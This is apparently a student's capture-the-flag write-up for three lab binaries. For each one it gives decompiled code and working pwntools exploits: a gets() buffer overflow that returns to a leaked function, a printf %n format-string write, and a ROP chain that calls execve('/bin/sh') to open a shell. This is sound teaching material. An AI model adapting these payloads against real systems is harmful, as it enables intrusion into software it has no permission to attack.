# call_me

```
As the name suggests, you should probably call some function (with the correct arguments) to make the service print a flag. Are there any other flags? Maybe...
```

In order to understand what the executable would normally do I tried to run it and when prompted I inserted random values.
Doing so I finally got this message outputted

```
Wow, you do know the song! However, you did not solve the challenge :-(
```

Reading this I thought that maybe some pattern matching was executed against the input looking for a specific song's lyrics.
Leveraging this I opened the file with Ghidra looking for something related.
Analysing the functions I found one with an interesting body

```c
void FUN_000111ed(int param_1,int param_2,int param_3)
{
	printf("BASC{");
	if (param_1 != 0xb100d) {
	    exit(1);
	}
	printf("you_g0t_");
	if (param_2 != 0x5e1ec7ed) {
	    exit(2);
	}
	printf("the_args_");
	if (param_3 != 0x7ea) {
        exit(3);
	}
	puts("right}.");
        exit(0x2a);
	}
}
```

This functions seemed to print a flag if some specific parameters where passed.
To better understand what was going on I used the functionality to show the functions' calls tree.
Doing so I discovered that the "print_flag" function was called by another one 

```c
void FUN_000112f8(void)
{
	char *pcVar1;
	int iVar2;
	char acStack_bd [165];
	size_t local_18;
	int local_14;
	int local_10;
  
	local_10 = 0;
	local_14 = 0;
	while( true ) {
	    if ((&PTR_s_Color_me_your_color,_baby_00014020)[local_14] == (undefined *)0x0) {
			puts("Wow, you do know the song! However, you did not solve the challenge :-(");
			return;
	    }
	    printf("Enter line #%d: ",local_14 + 1);
	    pcVar1 = gets(acStack_bd + 1);
	    if (pcVar1 == (char *)0x0) break;
	    local_18 = strlen(acStack_bd + 1);
	    if (0x50 < local_18) {
	      return;
	    }
	    if ((local_18 != 0) && (acStack_bd[local_18] == '\n')) {
	      acStack_bd[local_18] = '\0';
	    }
	    iVar2 = strcmp(acStack_bd + 1,(&PTR_s_Color_me_your_color,_baby_00014020)[local_14]);
	    if (iVar2 == 0) {
	      local_10 = local_10 + 1;
	      if (local_10 == 3) {
	        printf("&target=%p\n",print_flag);
	      }
	    }
	    else {
	      local_10 = local_10 + -1;
	    }
	    local_14 = local_14 + 1;
	  }
  return;
}
```

This function was actually the one that prompted the user to insert the song's lyrics and looking at the line 

```c
printf("Enter line #%d: ",local_14 + 1);
```

I understood that the variable **local_14** held a index that kept track the current song's lyrics line that would be later on compared with the one inserted by the user

```c
iVar2 = strcmp(acStack_bd + 1,(&PTR_s_Color_me_your_color,_baby_00014020)[local_14]);
```

If the comparison was successful the variable **local_10** would be incremented and when the value 3 was reached it should leak the address of the **print_flag** function.
So in order to get the address I had to insert three correct lines of the song's lyrics

```
> nc 192.168.20.1 5110
Enter line #1: Color me your color, baby
Enter line #2: Color me your car
Enter line #3: Color me your color, darling
&target=0x5664a1ed
```

Knowing this I could finally exploit the program through the **gets** function vulnerability.

```c
pcVar1 = gets(acStack_bd + 1);
```

It is possible to conduct a buffer overflow attack pretty easily figuring out the offset necessary to fill the **acStack_bd** variable ( e.g. using a cyclic pattern ) and then returning to the dynamically leaked function's address.
I had also to pass the correct parameters leaked by the **print_flag** function in order to get the flag.
Adding a 4 bytes offset between the function address and the parameters was necessary due to the architecture calling convention.

```python
p = pwn.remote(HOST, PORT)
p.recvuntil(b":")
p.sendline(b"Color me your color, baby")
p.recvuntil(b":")
p.sendline(b"Color me your car")
p.recvuntil(b":")
p.sendline(b"Color me your color, darling")
leaked_address = p.recvuntil(b"target=")
leaked_address = p.recvline().strip().decode()
p.sendline(
	b"a" * OFFSET
	+ pwn.p32(int(leaked_address, 16))
	+ b"a" * 4
	+ pwn.p32(int(FIRST_PARAM, 16))
	+ pwn.p32(int(SECOND_PARAM, 16))
	+ pwn.p32(int(THIRD_PARAM, 16))
)
p.interactive()
```

Doing so I was able to get the first flag

```
BASC{you_g0t_the_args_right}
```

Since the exercise description hinted the presence of other flags I tried to gather more info about the file security using the **checksec** command

```json
{
	"call_me_thaMilo": 
	{
	    "relro": "full",
	    "canary": "no",
	    "nx": "yes",
	    "pie": "yes",
	    "rpath": "no",
	    "runpath": "no",
	    "symbols": "no",
	    "fortify_source": "no",
	    "fortified": "0",
	    "fortify-able": "2"
	}
}
```

Since **nx** is enabled is impossible to execute shell-codes and considering all the other security measures the only vulnerability I could find was trying to conduct a ret-to-libc attack.



# the_answer

```
There is a unique answer to the Ultimate Question of Life, the Universe, and Everything.
BTW, `0xbadc0ffe` isn'it.

Warning: Ghidra's decompiler sometimes (it depends on the Ghidra version) tries too hard to be clever and may "optimize" (=hide/remove) something it shouldn't.
So, do not blindly trust its output and take a look at the assembly view as well.
```

In order to understand what the executable would normally do I tried to run it and when prompted I inserted a my name since it asked for it.
It replied only with "Hi, Milo".
So I had to check what was going on inside with Ghidra.

```c
undefined8 main(void)
{
  int __fd;
  ssize_t sVar1;
  size_t __n;
  long in_FS_OFFSET;
  char local_1018 [4104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  memset(local_1018,0,0x1000);
  puts("What\'s your name?");
  sVar1 = read(0,local_1018,0x1000);
  if (sVar1 < 1) {
    exit(1);
  }
  printf("Hi, ");
  printf(local_1018);
  if (DAT_00404308 == 0x2a) {
    puts("Exactly! Here\'s your flag:");
    __fd = open("flag.txt",0);
    __n = read(__fd,local_1018,0x1000);
    write(1,local_1018,__n);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return 0;
}
```

With a quick look I saw that if the variable **DAT_00404308** was equal to 0x2a, 42 decimal ( \*Galaxy Hitchhiker nodding\* ) the **flag.txt** file was read and printed out... so the focus was getting that variable to hold the correct value.
In order to do so I exploited the **printf** vulnerability that printed out the buffer holding the user input without formatting it

```c
printf(local_1018);
```

As seen in the slides using **%n** I could write to an address the number of characters printed out until that moment.
So I had to use this exploit to to write 42 to **0x404308** that was holding the value being tested.
First step was finding the stack variable that would hold the address.
This was done empirically by sending a payload printing the stack content

```python
payload = b"aaaa %x " * 30

'''
OUTPUT 

Hi, aaaa 5e63d020 aaaa 0 aaaa 217aa37 aaaa 4 aaaa 2296040 aaaa 5e640298 aaaa 10 aaaa 90 aaaa 8 aaaa 6474e553 aaaa 350 aaaa 61616161 aaaa 61616161 aaaa 61616161 aaaa 61616161 aaaa 61616161 aaaa 61616161 aaaa 61616161 aaaa 61616161 aaaa 61616161 aaaa 61616161 aaaa 61616161 aaaa 61616161 aaaa 61616161 aaaa 61616161 aaaa 61616161 aaaa 61616161 aaaa 61616161 aaaa 61616161 aaaa 61616161
'''
```

Sending that payload I figured out that when **%x** was printed out as **61616161** ( ascii for 'a' ) I was writing on the stack.
Gradually decrementing I found out that the last variable on the stack was the 11th.
Before inserting the address anyway I had to print out 42 times a random char, so the address **0x404308** wouldn't be stored in the 12th stack variable but something more.
Empirically I found out that after writing 42 characters the address would be stored in the 18th stack variable so the final payload would be structured like so 

```python
p = pwn.remote(HOST, PORT)
payload = b"a" * 42 + b"%18$nA" + pwn.p64(0x404308) # 'A' is a padding for alignment
p.sendline(payload)
p.interactive()
```

```
BASC{50_LoNg_&_Thanks_for_4ll_tH3_F1sh___3SBqYIJf}
```

# rop-test

```
*Really Optimized Primality-test* is a service that can tell you whether a number
is prime or not.
Well, being extremely optimized, if the service tells you that a number is not
a prime then you can be sure, otherwise well... let's say it depends ;)

Anyway, the flag is in the usual place. Can you read the flag?

**Hint**: the simplest/most-direct solution does *not* leverage a ret-to-libc attack. Pay attention at the challenge name ;)
```

As I did for the other exercises I just ran the program to see the normal behaviour and when prompted I inserted some values not noticing anything particularly interesting.
So I took a look inside using Ghidra and discovered the main function

```c
{
  int iVar1;
  char *pcVar2;
  size_t sVar3;
  char acStack_d9 [125];
  uint local_5c [19];
  size_t local_10;
  
  printf("Enter a number: ");
  pcVar2 = fgets(acStack_d9 + 1,0x200,stdin);
  if (pcVar2 == (char *)0x0) {
    exit(1);
  }
  sVar3 = strlen(acStack_d9 + 1);
  local_10 = sVar3;
  if ((sVar3 != 0) && (acStack_d9[sVar3] == '\n')) {
    local_10 = sVar3 - 1;
    acStack_d9[sVar3] = '\0';
  }
  iVar1 = strcmp(acStack_d9 + 1,"/bin/sh");
  if (iVar1 == 0) {
    puts("Exploitation attempt detected! This incident will be reported.");
  }
  else {
    iVar1 = __isoc99_sscanf(acStack_d9 + 1,&DAT_0040209f,local_5c);
    if (iVar1 < 1) {
      puts("Please enter a number!");
    }
    else if ((int)local_5c[0] < 2) {
      puts("Please enter a number greater than 1");
    }
    else {
      iVar1 = FUN_004011e0(local_5c[0]);
      if (iVar1 == 0) {
        printf("%d is definitely not a prime.\n",(ulong)local_5c[0]);
      }
      else {
        printf("%d might be a prime.\n",(ulong)local_5c[0]);
      }
    }
  }
  return;
}
```

I noticed that the buffer holding the input, **ac_Stack_d9**, had a size of 125 but the **fgets** function called immediately after accepted 0x200 ( 512 ) bytes as input.
So as hinted by the exercise description this opens a window for a ROP attack.
First I found the buffer overflow offset using a cyclic pattern and the gadgets using ropper and Ghidra.
Once I found all the necessary addresses I had to look at the x86_64 ABI to know how to assemble the payload.
Since arguments are passed in registers in a 64 bit architecture I had to pop registers and modify values inside them in order to spawn a shell using a call to **execve** and the **/bin/sh** string located in the main function

```c
iVar1 = strcmp(acStack_d9 + 1,"/bin/sh");
```

So the final payload was 

```python
payload = (
    b"A" * OFFSET
    + pwn.p64(RET)
    + pwn.p64(POP_RAX)
    + pwn.p64(59)
	+ pwn.p64(POP_RDI_RBX)
	+ pwn.p64(BIN_SH)
	+ pwn.p64(0)
	+ pwn.p64(XOR_RSI)
	+ pwn.p64(POP_RDX)
	+ pwn.p64(0)
	+ pwn.p64(SYSCALL)
)
```

Where :
1. A offset is placed in order to exploit the buffer overflow vulnerability
2. A RET instruction gadget is placed to align the stack to a 16 byte boundary for the syscall
3. The value 59 ( execve syscall ) is placed inside the RAX register
4. The address of the **/bin/sh** string is placed inside the RDI register preparing the first argument for execve, while 0 is placed in RBX because there was no simple "pop rdi; ret" gadget but only a "pop rdi; pop rbx; ret"
5. A XOR is performed on the rsi register to place the value 0 inside it preparing the second argument for execve
6. The value 0 is placed inside the RDX register
7. The syscall is finally performed resulting in :
   - RAX = 59 --> execve
   - RDI = /bin/sh
   - RSI = 0
   - RDX = 0

Doing so I was able to get the flag printing the content of flag.txt

```
BASC{c0d3_r3U5e_FtW___c4OfU73e}
```
